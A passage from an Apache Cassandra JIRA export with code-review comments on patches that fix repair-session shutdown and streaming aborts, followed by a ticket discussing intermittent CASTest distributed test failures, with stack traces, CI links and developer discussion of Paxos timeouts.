+ *  INITIALIZED --> PREPARING --> STREAMING ------------> WAIT_COMPLETE ----> COMPLETED
+ *  |                  |              |                         ^                 ^
+ *  |                  |              |       follower          |                 |
+ *  |                  |              +-------------------------)-----------------+
+ *  |                  |                                        |                 |
+ *  |                  |         if preview                     |                 |
+ *  |                  +----------------------------------------+                 |
+ *  |               nothing to request or to transfer                             |
+ *  +-----------------------------------------------------------------------------+
+ *                  nothing to request or to transfer
+ *
+ *  </pre>
+ */
     public enum State

Review comment:
       In general, the fact that we don't actually check our state transitions for validity in StreamSession concerns me a bit. Might want a follow up JIRA to harden state transition logic in this class to where we actually validate it for correctness on state() calls.

##########
File path: test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java
##########
@@ -71,6 +81,52 @@ public void testRemoteValidationFailure() throws IOException
         }
     }
 
+    @SuppressWarnings(""Convert2MethodRef"")
+    @Test
+    public void testRemoteSyncFailure() throws Exception
+    {
+        try (Cluster cluster = init(Cluster.build(3)
+                                           .withConfig(config -> config.with(GOSSIP)
+                                                                       .with(NETWORK)
+                                                                       .set(""disk_failure_policy"", ""stop"")
+                                                                       .set(""disk_access_mode"", ""mmap_index_only""))
+                                           .withInstanceInitializer(ByteBuddyHelper::installStreamPlanExecutionFailure).start()))
+        {
+            cluster.schemaChange(""create table "" + KEYSPACE + "".tbl (id int primary key, x int)"");
+            
+            // On repair, this data layout will require two (local) syncs from node 1 and one remote sync from node 2:
+            cluster.get(1).executeInternal(""insert into "" + KEYSPACE + "".tbl (id, x) VALUES (?,?)"", 1, 1);
+            cluster.get(2).executeInternal(""insert into "" + KEYSPACE + "".tbl (id, x) VALUES (?,?)"", 2, 2);
+            cluster.get(3).executeInternal(""insert into "" + KEYSPACE + "".tbl (id, x) VALUES (?,?)"", 3, 3);
+            cluster.forEach(i -> i.flush(KEYSPACE));
+            
+            // Flush system.peers_v2, or there won't be any SSTables...
+            cluster.forEach(i -> i.flush(""system""));
+            
+            // The remote sync started from node 2 will fail on plan execution and propagate the error...
+            NodeToolResult result = cluster.get(1).nodetoolResult(""repair"", KEYSPACE);
+            result.asserts().failure().errorContains(""Sync failed between /127.0.0.2:7012 and /127.0.0.3:7012"");
+
+            assertTrue(cluster.get(1).logs().grep(""Stopping transports as disk_failure_policy is stop"").getResult().isEmpty());

Review comment:
       May want to leave a bread crumb comment here (referencing this JIRA + reasoning) as to why we're checking these three specific things to make sure they're not present in the logs.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;24/Mar/22 16:30;githubbot;600","dcapwell commented on a change in pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522#discussion_r834511543



##########
File path: src/java/org/apache/cassandra/streaming/StreamSession.java
##########
@@ -183,34 +191,35 @@
     private final TimeUUID pendingRepair;
     private final PreviewKind previewKind;
 
-    /**
-     * State Transition:
-     *
-     * <pre>
-     *  +------------------+----------> FAILED <--------------------+
-     *  |                  |              ^                         |
-     *  |                  |              |       initiator         |
-     *  INITIALIZED --> PREPARING --> STREAMING ------------> WAIT_COMPLETE ----> COMPLETED
-     *  |                  |              |                         ^                 ^
-     *  |                  |              |       follower          |                 |
-     *  |                  |              +-------------------------)-----------------+
-     *  |                  |                                        |                 |
-     *  |                  |         if preview                     |                 |
-     *  |                  +----------------------------------------+                 |
-     *  |               nothing to request or to transfer                             |
-     *  +-----------------------------------------------------------------------------+
-     *                  nothing to request or to transfer
-     *
-     *  </pre>
-     */
+/**
+ * State Transition:
+ *
+ * <pre>
+ *  +------------------+-----> FAILED | ABORTED <---------------+
+ *  |                  |              ^                         |
+ *  |                  |              |       initiator         |
+ *  INITIALIZED --> PREPARING --> STREAMING ------------> WAIT_COMPLETE ----> COMPLETED
+ *  |                  |              |                         ^                 ^
+ *  |                  |              |       follower          |                 |
+ *  |                  |              +-------------------------)-----------------+
+ *  |                  |                                        |                 |
+ *  |                  |         if preview                     |                 |
+ *  |                  +----------------------------------------+                 |
+ *  |               nothing to request or to transfer                             |
+ *  +-----------------------------------------------------------------------------+
+ *                  nothing to request or to transfer
+ *
+ *  </pre>
+ */
     public enum State

Review comment:
       +1




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;24/Mar/22 16:38;githubbot;600","maedhroz commented on a change in pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522#discussion_r834622267



##########
File path: test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java
##########
@@ -20,27 +20,37 @@
 
 import java.io.IOException;
 import java.util.Collection;
-import java.util.UUID;
-
-import org.assertj.core.api.Assertions;
-import org.junit.Test;
+import java.util.concurrent.Callable;
+import java.util.concurrent.TimeUnit;
 
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
 import net.bytebuddy.implementation.MethodDelegation;
+import net.bytebuddy.implementation.bind.annotation.SuperCall;
+import org.apache.cassandra.db.SystemKeyspace;

Review comment:
       Ouch. Yeah, will clean this up.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;24/Mar/22 18:46;githubbot;600","maedhroz commented on a change in pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522#discussion_r834623029



##########
File path: test/distributed/org/apache/cassandra/distributed/test/RepairErrorsTest.java
##########
@@ -71,6 +81,52 @@ public void testRemoteValidationFailure() throws IOException
         }
     }
 
+    @SuppressWarnings(""Convert2MethodRef"")
+    @Test
+    public void testRemoteSyncFailure() throws Exception
+    {
+        try (Cluster cluster = init(Cluster.build(3)
+                                           .withConfig(config -> config.with(GOSSIP)
+                                                                       .with(NETWORK)
+                                                                       .set(""disk_failure_policy"", ""stop"")
+                                                                       .set(""disk_access_mode"", ""mmap_index_only""))
+                                           .withInstanceInitializer(ByteBuddyHelper::installStreamPlanExecutionFailure).start()))
+        {
+            cluster.schemaChange(""create table "" + KEYSPACE + "".tbl (id int primary key, x int)"");
+            
+            // On repair, this data layout will require two (local) syncs from node 1 and one remote sync from node 2:
+            cluster.get(1).executeInternal(""insert into "" + KEYSPACE + "".tbl (id, x) VALUES (?,?)"", 1, 1);
+            cluster.get(2).executeInternal(""insert into "" + KEYSPACE + "".tbl (id, x) VALUES (?,?)"", 2, 2);
+            cluster.get(3).executeInternal(""insert into "" + KEYSPACE + "".tbl (id, x) VALUES (?,?)"", 3, 3);
+            cluster.forEach(i -> i.flush(KEYSPACE));
+            
+            // Flush system.peers_v2, or there won't be any SSTables...
+            cluster.forEach(i -> i.flush(""system""));
+            
+            // The remote sync started from node 2 will fail on plan execution and propagate the error...
+            NodeToolResult result = cluster.get(1).nodetoolResult(""repair"", KEYSPACE);
+            result.asserts().failure().errorContains(""Sync failed between /127.0.0.2:7012 and /127.0.0.3:7012"");
+
+            assertTrue(cluster.get(1).logs().grep(""Stopping transports as disk_failure_policy is stop"").getResult().isEmpty());

Review comment:
       Yeah, I'll comment on how this actually failed before 17466. (i.e. I'll describe the steps to repro as well.)




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;24/Mar/22 18:47;githubbot;600","maedhroz commented on a change in pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522#discussion_r834631812



##########
File path: src/java/org/apache/cassandra/repair/RepairSession.java
##########
@@ -372,8 +373,24 @@ public void terminate()
     public void forceShutdown(Throwable reason)
     {
         tryFailure(reason);
-        taskExecutor.shutdownNow();
+        taskExecutor.shutdown();
         terminate();
+        awaitTaskExecutorTermination();
+    }
+
+    private void awaitTaskExecutorTermination()
+    {
+        try
+        {
+            if (taskExecutor.awaitTermination(30, TimeUnit.SECONDS))

Review comment:
       The only two things I've actually seen in testing are basically immediate termination and never terminating. To the extent that it identifies both of those things, it's probably fine. The interesting thing would be if abort doesn't clean things up properly, leaving a long-running streaming task open or something. 30 seconds seemed like a long enough time for us to catch that case as well. Are there any other timeouts in the repair/streaming ecosystem that would be good derivatives?




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;24/Mar/22 18:58;githubbot;600","josh-mckenzie commented on a change in pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522#discussion_r834636977



##########
File path: src/java/org/apache/cassandra/repair/RepairSession.java
##########
@@ -372,8 +373,24 @@ public void terminate()
     public void forceShutdown(Throwable reason)
     {
         tryFailure(reason);
-        taskExecutor.shutdownNow();
+        taskExecutor.shutdown();
         terminate();
+        awaitTaskExecutorTermination();
+    }
+
+    private void awaitTaskExecutorTermination()
+    {
+        try
+        {
+            if (taskExecutor.awaitTermination(30, TimeUnit.SECONDS))

Review comment:
       I mean, the # seems fine enough to me just wasn't sure where it came from. :)




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;24/Mar/22 19:05;githubbot;600","maedhroz closed pull request #1521:
URL: https://github.com/apache/cassandra/pull/1521


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;28/Mar/22 20:52;githubbot;600","maedhroz commented on pull request #1521:
URL: https://github.com/apache/cassandra/pull/1521#issuecomment-1081131786


   Committed as https://github.com/apache/cassandra/commit/0089858819c9f06b0bee5bccf993ae7f5977d7f1


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;28/Mar/22 20:52;githubbot;600","maedhroz closed pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;28/Mar/22 20:52;githubbot;600","maedhroz commented on pull request #1522:
URL: https://github.com/apache/cassandra/pull/1522#issuecomment-1081132317


   Committed as https://github.com/apache/cassandra/commit/7b58b79fe24c612f8bbf7984c325e88496f482d6


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;28/Mar/22 20:52;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,7200,,,0,7200,,,,,,,,,,,,,,,,,CASSANDRA-17541,,,,CASSANDRA-17541,,,,,,CASSANDRA-17663,CASSANDRA-17648,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Challenging,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Mar 30 04:58:31 UTC 2022,,,,,,,All,,,,"0|z10oow:",9223372036854775807,,,,dcapwell,,,,Critical,,4.0,,https://github.com/apache/cassandra/commit/0089858819c9f06b0bee5bccf993ae7f5977d7f1,,,,,,,,,new test that reproduces the root cause of the problems described in the issue,,,,,"23/Mar/22 17:22;maedhroz;I've submitted a patch that addresses the problem by 1.) avoiding abrupt {{shutdownNow()}} calls on repair failure and 2.) adds an abort mechanism for outstanding local repair sync tasks. There may have been a viable way to fix this particular issue by pulling the {{getPreferredIP()}} call out of repair task threads, but using an interrupting shutdown when we don't have a comprehensive understanding of our interrupt handling downstream seems risky. (Also, there is a fix contained here that actually makes sure the task executor pool shuts down. It was trying to shut itself down before, which wasn't going so well...)

|4.0|trunk|
|[patch|https://github.com/apache/cassandra/pull/1521]|[patch|https://github.com/apache/cassandra/pull/1522]|
|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17466-4.0&filter=all]|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17466-trunk&filter=all]|
|[Apache CI|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1540/]|[Apache CI|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1542/]|;;;","23/Mar/22 19:14;maedhroz;CC [~dcapwell] [~marcuse] ;;;","24/Mar/22 16:23;jmckenzie;Going to defer to David and Marcus on review as they're both already familiar with the patch.;;;","24/Mar/22 16:39;dcapwell;+1;;;","25/Mar/22 03:15;maedhroz;As far as the test failures go, 4.0 seems to have mostly known issues w/ upgrade tests and CASSANDRA-17139. The Apache Jenkins CI run actually has [fewer|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1540/#showFailuresLink] errors than the [latest|https://ci-cassandra.apache.org/job/Cassandra-4.0/366/#showFailuresLink] {{cassandra-4.0}} run. The only sort of interesting one is [test_dead_sync_initiator|https://app.circleci.com/pipelines/github/maedhroz/cassandra/403/workflows/ab28810f-e1ca-4d56-9962-cb8ecc1f2382/jobs/2926/tests#failed-test-0]. There is a history of failure (ex. CASSANDRA-15963), and this only fails in Circle.;;;","28/Mar/22 17:57;maedhroz;The trunk patch looks clean RE test failures. All of them are showing up on Butler as existing problems. I'm running [test_dead_sync_initiator|https://app.circleci.com/pipelines/github/maedhroz/cassandra/403/workflows/ab28810f-e1ca-4d56-9962-cb8ecc1f2382/jobs/2926/tests#failed-test-0] locally on the 4.0 branch, but then I'll probably move forward and commit...;;;","28/Mar/22 20:53;maedhroz;Committed in https://github.com/apache/cassandra/commit/0089858819c9f06b0bee5bccf993ae7f5977d7f1;;;","29/Mar/22 10:37;bereng;I haven't dug deep. But could sbdy in the know check if this commit could be related to the recent rise in trunk failures on commit log closure please?;;;","29/Mar/22 16:01;maedhroz;[~bereng] I look a [quick look|https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-trunk/trunk] at Butler, and there are definitely some new issues w/ the [group commit log tests|https://ci-cassandra.apache.org/job/Cassandra-trunk/1051/testReport/org.apache.cassandra.db.commitlog/GroupCommitLogTest/replaySimple_4__compression/]. Are those just CASSANDRA-17469, which was created a week ago (before this merged)? Looks similar to CASSANDRA-17286 as well...;;;","30/Mar/22 04:58;bereng;Thx for checking [~maedhroz]!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation,CASSANDRA-17461,13434894,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bdeggleston,adelapena,adelapena,21/Mar/22 12:27,05/Oct/22 22:22,13/Jul/23 08:40,26/Sep/22 15:28,4.1,4.1-beta1,,,,,Test/dtest/java,,,,0,,"Intermittent failures on {{org.apache.cassandra.distributed.test.CASTest}} for trunk:

* [testConflictingWritesWithStaleRingInformation|https://ci-cassandra.apache.org/job/Cassandra-trunk/1024/testReport/org.apache.cassandra.distributed.test/CASTest/testConflictingWritesWithStaleRingInformation_3/]
* [testSuccessfulWriteBeforeRangeMovement|https://ci-cassandra.apache.org/job/Cassandra-trunk/1025/testReport/org.apache.cassandra.distributed.test/CASTest/testSuccessfulWriteBeforeRangeMovement/]
* [testSuccessfulWriteDuringRangeMovementFollowedByConflicting|https://ci-cassandra.apache.org/job/Cassandra-trunk/1020/testReport/org.apache.cassandra.distributed.test/CASTest/testSuccessfulWriteDuringRangeMovementFollowedByConflicting/]
* [testSucccessfulWriteDuringRangeMovementFollowedByRead|https://ci-cassandra.apache.org/job/Cassandra-trunk/1020/testReport/org.apache.cassandra.distributed.test/CASTest/testSucccessfulWriteDuringRangeMovementFollowedByRead/]

All four seem to have the same aspect:
{code}
Failed 2 times in the last 5 runs. Flakiness: 50%, Stability: 60%
Error Message
CAS operation timed out: received 1 of 2 required responses after 0 contention retries
Stacktrace
org.apache.cassandra.exceptions.CasWriteTimeoutException: CAS operation timed out: received 1 of 2 required responses after 0 contention retries
	at org.apache.cassandra.service.paxos.Paxos$MaybeFailure.markAndThrowAsTimeoutOrFailure(Paxos.java:547)
	at org.apache.cassandra.service.paxos.Paxos.begin(Paxos.java:1048)
	at org.apache.cassandra.service.paxos.Paxos.cas(Paxos.java:659)
	at org.apache.cassandra.service.paxos.Paxos.cas(Paxos.java:618)
	at org.apache.cassandra.service.StorageProxy.cas(StorageProxy.java:307)
	at org.apache.cassandra.cql3.statements.ModificationStatement.executeWithCondition(ModificationStatement.java:500)
	at org.apache.cassandra.cql3.statements.ModificationStatement.execute(ModificationStatement.java:467)
	at org.apache.cassandra.distributed.impl.Coordinator.unsafeExecuteInternal(Coordinator.java:122)
	at org.apache.cassandra.distributed.impl.Coordinator.unsafeExecuteInternal(Coordinator.java:103)
	at org.apache.cassandra.distributed.impl.Coordinator.lambda$executeWithResult$0(Coordinator.java:66)
	at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47)
	at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:829)
Standard Output
DEBUG [main] 2022-03-19 16:20:42,868 Reflections.java:198 - going to scan these urls: [jar:file:/home/cassandra/cassandra/build/apache-cassandra-4.1-SNAPSHOT.jar!/, jar:file:/home/cassandra/cassandra/build/test/lib/jars/simulator-bootstrap.jar!/, jar:file:/home/cassandra/cassandra/build/test/lib/jars/dtest-api-0.0.12.jar!/, file:/home/cassandra/cassandra/build/classes/fqltool/, file:/home/cassandra/cassandra/build/test/classes/, file:/home/cassandra/cassandra/build/classes/main/, file:/home/cass
...[truncated 4929659 chars]...
gService.java:519 - Waiting for messaging service to quiesce

INFO  [node1_isolatedExecutor:10] 2022-03-19 16:21:55,223 SubstituteLogger.java:169 - INFO  [node1_isolatedExecutor:10] node1 2022-03-19 16:21:55,221 MessagingService.java:519 - Waiting for messaging service to quiesce

INFO  [node2_isolatedExecutor:8] 2022-03-19 16:21:55,223 SubstituteLogger.java:169 - INFO  [node2_isolatedExecutor:8] node2 2022-03-19 16:21:55,222 MessagingService.java:519 - Waiting for messaging service to quiesce
{code}
Failures can also be repeatedly hit with CircleCI test multiplexer:

[https://app.circleci.com/pipelines/github/adelapena/cassandra/1394/workflows/8d40d44b-7ccb-40fe-82d5-37db0bb228a3].

The same test looks ok in 4.0, as suggested by Butler and [this repeated Circle run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1395/workflows/5669dd1e-1a4c-4801-b1a1-c3ca04a29e2b].",,adelapena,bdeggleston,benedict,bereng,e.dimitrova,jmckenzie,maedhroz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17164,,,,,,,,,,,,CASSANDRA-17462,,,,,,,,,,,,,,,,,,,,0.0,bdeggleston,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Sep 26 14:06:13 UTC 2022,,,,,,,All,,,,"0|z10o60:",9223372036854775807,,,,bdeggleston,benedict,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/286d2ee053ac2e6fe50749fa2833533254697662,,,,,,,,,circle,,,,,"04/May/22 11:02;bereng;Gave it a go hoping increased timeouts would help but only do for some cases, not for the whole class. Need to look further in...;;;","08/Jun/22 12:00;e.dimitrova;This one reproduces easily in CircleCI. 

My bisecting shows it is failing after CEP-14 was committed.

[200 runs no failures|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1709/workflows/0da6056e-bb8d-4865-b24b-601bd28eadb3] before CEP-14, [200 runs and 5 failures|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1707/workflows/d6950287-f00e-428b-976e-1f19dfac0345/jobs/11936] after. It was changed in CEP-14.

[~benedict] , [~bdeggleston] , can anyone of you take a look, please? ;;;","08/Jun/22 12:23;benedict;I don't think the test was materially changed, just refactored to share the cluster and to use the new Verbs. AFAICT it is behaviourally identical. But Paxos was changed, and this perhaps affected timings. I think perhaps we impose request timeouts more accurately now, and this could impact flakiness.

The relevant timeout to change would not be the test timeout though, but the contention and request timeouts, as these affect how quickly these request timeouts would fire which might be relevant in flaky VM environments.

Not sure when I'll get a chance to look more closely myself.;;;","14/Jul/22 17:10;adelapena;Wasn't that test ignored before CEP-14? I think it has been marked as {{@Ignored}} since its introduction on CASSANDRA-12126, which would explain why the pre-CEP-14 run passes so quickly. CEP-14 modified the test and removed the {{@Ignored}} annotation for the very first time, and it has been flaky since then.;;;","14/Jul/22 17:19;brandon.williams;Indeed, if the ignore is removed in 4.0, it also fails the same way as can be seen [here|https://app.circleci.com/pipelines/github/driftx/cassandra/547/workflows/3c58bb72-0fa2-4015-9919-6cba2b1b9957/jobs/6518].  Should we unblock beta from this ticket and move it to rc instead?;;;","27/Jul/22 18:09;jmckenzie;Noticing that a lot of our 4.1 failures in butler appear to be linked to this ticket. If we were {{@Ignored}} since the test was initially introduced, shouldn't we be skeptical of its correctness, add back the annotation, create a follow up ticket to either fix or remove the test for 4.2, and close this out?;;;","27/Jul/22 20:28;maedhroz;bq. The relevant timeout to change would not be the test timeout though, but the contention and request timeouts, as these affect how quickly these request timeouts would fire which might be relevant in flaky VM environments.

Would it be worth making a quick pass at these timeouts before ignoring again?;;;","27/Jul/22 20:49;brandon.williams;Those are actually the timeouts that were changed in Bereng's PR above.;;;","29/Jul/22 00:10;jmckenzie;Tried checking out the SHA for CASSANDRA-12126 to see if the test passed this morning and it wouldn't build; didn't feel like investing more cycles than to confirm the test in question was definitely {{@Ignored}} on introduction. [~slebresne] (who's OOO for a few weeks but leaving here for posterity) - any chance you recall that test and why it was flagged as ignored on addition?

I'm going to beat the drum again here - I say we add the {{@Ignored}} annotation back and create another ticket to get to the bottom of this that's 4.2 since this isn't a regression and we can keep making progress towards 4.1. Anyone against? Happy to do the grunt work myself early next week to tidy this up.;;;","29/Jul/22 07:39;benedict;Sorry for missing this discussion. These tests when added were known to fail because they demonstrated real bugs with Paxos v1, so we marked them \@Ignore to avoid polluting everyone's test results. Paxos v2 fixes these bugs, so these tests are now valuable.;;;","29/Jul/22 10:34;brandon.williams;So then, would you like to make them pass?;;;","29/Jul/22 10:38;benedict;If you're willing to wait for me to get round to it, sure.

Otherwise try bumping the message timeouts, rather than test timeouts? Presumably the environment has gotten flakier.
;;;","29/Jul/22 10:45;brandon.williams;Are [these|https://github.com/apache/cassandra/pull/1603/commits/2be278db2fe51ddf6ef534f9b44835046a898c00] the correct ones to adjust?;;;","29/Jul/22 11:15;benedict;Probably. Unfortunately the links to outcomes for each test appear to be broken, but looking at the [log file|https://circleci.com/api/v1.1/project/github/adelapena/cassandra/14107/output/103/5?file=true&allocation-id=6238ab6a00c61f3c0b452b00-5-build%2F3ED5FD94], I cannot tell what log output is for what test case.;;;","29/Jul/22 12:43;adelapena;[Here|https://app.circleci.com/pipelines/github/adelapena/cassandra/1968/workflows/1917904b-8a49-4bf6-9b39-282ac1af7424/jobs/19590] is a new repeated CI run only for the new {{{}CASTest.testConflictingWritesWithStaleRingInformation{}}}. It shows a 5% flakiness. The CircleCI config file has been generated with:
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=test-jvm-dtest-some \
  -e REPEATED_UTEST_COUNT=200 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.CASTest \
  -e REPEATED_UTEST_METHODS=testConflictingWritesWithStaleRingInformation
{code}
The standard output, logs, and Junit report for each iteration can be found on [the artifacts tab|https://app.circleci.com/pipelines/github/adelapena/cassandra/1968/workflows/1917904b-8a49-4bf6-9b39-282ac1af7424/jobs/19590/artifacts]. The failed runs contain ""fails"" on the path, while the successful runs contain ""passes"". For example, these are the files for the 2nd iteration of the 6th runner:
 * [stdout/fails/2/test-jvm-dtest-some-org.apache.cassandra.distributed.test.CASTest.txt|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/stdout/fails/2/test-jvm-dtest-some-org.apache.cassandra.distributed.test.CASTest.txt]
 * [junitxml/fails/2/TEST-org.apache.cassandra.distributed.test.CASTest-testConflictingWritesWithStaleRingInformation.xml|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/junitxml/fails/2/TEST-org.apache.cassandra.distributed.test.CASTest-testConflictingWritesWithStaleRingInformation.xml]
 * [logs/fails/2/org.apache.cassandra.distributed.test.CASTest/<main>/<main>/system.log|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/logs/fails/2/org.apache.cassandra.distributed.test.CASTest/%3Cmain%3E/%3Cmain%3E/system.log]
 * [logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-e838e8c8-e117-4520-9396-ab1b145f2a2b/node1/system.log|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-e838e8c8-e117-4520-9396-ab1b145f2a2b/node1/system.log]
 * [logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-e838e8c8-e117-4520-9396-ab1b145f2a2b/node2/system.log|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-e838e8c8-e117-4520-9396-ab1b145f2a2b/node2/system.log]
 * [logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-e838e8c8-e117-4520-9396-ab1b145f2a2b/node3/system.log|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-e838e8c8-e117-4520-9396-ab1b145f2a2b/node3/system.log]
 * [logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-fa769a52-7814-4842-8760-7c158e8282e0/node1/system.log|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-fa769a52-7814-4842-8760-7c158e8282e0/node1/system.log]
 * [logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-fa769a52-7814-4842-8760-7c158e8282e0/node2/system.log|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-fa769a52-7814-4842-8760-7c158e8282e0/node2/system.log]
 * [logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-fa769a52-7814-4842-8760-7c158e8282e0/node3/system.log|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-fa769a52-7814-4842-8760-7c158e8282e0/node3/system.log]
 * [logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-fa769a52-7814-4842-8760-7c158e8282e0/node4/system.log|https://output.circle-artifacts.com/output/job/2fd9786b-db08-4079-909b-8090f30ef78a/artifacts/6/logs/fails/2/org.apache.cassandra.distributed.test.CASTest/cluster-fa769a52-7814-4842-8760-7c158e8282e0/node4/system.log];;;","29/Jul/22 12:49;benedict;So the first one of these failures is nothing to do with this test:

{noformat}
[junit-timeout] ------------- ---------------- ---------------
[junit-timeout] Testcase: org.apache.cassandra.distributed.test.CASTest:	Caused an ERROR
[junit-timeout] Uncaught exceptions were thrown during test
[junit-timeout] org.apache.cassandra.distributed.shared.ShutdownException: Uncaught exceptions were thrown during test
[junit-timeout] 	at org.apache.cassandra.distributed.impl.AbstractCluster.checkAndResetUncaughtExceptions(AbstractCluster.java:1058)
[junit-timeout] 	at org.apache.cassandra.distributed.impl.AbstractCluster.close(AbstractCluster.java:1044)
[junit-timeout] 	at org.apache.cassandra.distributed.test.CASTest.afterClass(CASTest.java:93)
[junit-timeout] 	Suppressed: java.lang.RuntimeException: java.lang.IllegalStateException: HintsService is shut down and can't accept new hints
